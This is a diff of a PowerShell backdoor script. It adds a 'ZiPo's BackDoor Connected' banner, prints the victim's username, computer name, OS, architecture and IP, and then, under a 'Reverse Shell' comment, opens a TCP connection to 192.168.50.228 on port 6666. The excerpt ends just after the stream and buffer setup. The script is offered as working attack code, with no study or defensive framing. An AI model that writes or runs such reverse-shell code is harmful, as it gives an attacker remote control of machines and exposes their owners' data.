@@ -1,3 +1,25 @@
+$Host.UI.RawUI.ForegroundColor = "Red"
+Write-Host "
+███████╗██╗██████╗  ██████╗ ███████╗
+██╔════╝██║██╔══██╗██╔════╝ ██╔════╝
+███████╗██║██████╔╝██║  ███╗█████╗  
+╚════██║██║██╔═══╝ ██║   ██║██╔══╝  
+███████║██║██║     ╚██████╔╝███████╗
+╚══════╝╚═╝╚═╝      ╚═════╝ ╚══════╝
+      ZiPo's BackDoor Connected
+" -ForegroundColor Red
+
+$Host.UI.RawUI.ForegroundColor = "Green"
+
+# Вывод базовой инфы о системе
+Write-Host "Username: $env:USERNAME"
+Write-Host "Computer: $env:COMPUTERNAME"
+Write-Host "OS: $([System.Environment]::OSVersion.VersionString)"
+Write-Host "Architecture: $env:PROCESSOR_ARCHITECTURE"
+Write-Host "IP: $((Test-Connection -ComputerName (hostname) -Count 1).IPv4Address.IPAddressToString)"
+Write-Host "`n---------------------------------------------------`n"
+
+# Reverse Shell
 $client = New-Object System.Net.Sockets.TCPClient("192.168.50.228",6666);
 $stream = $client.GetStream();
 [byte[]]$bytes = 0..65535|%{0};
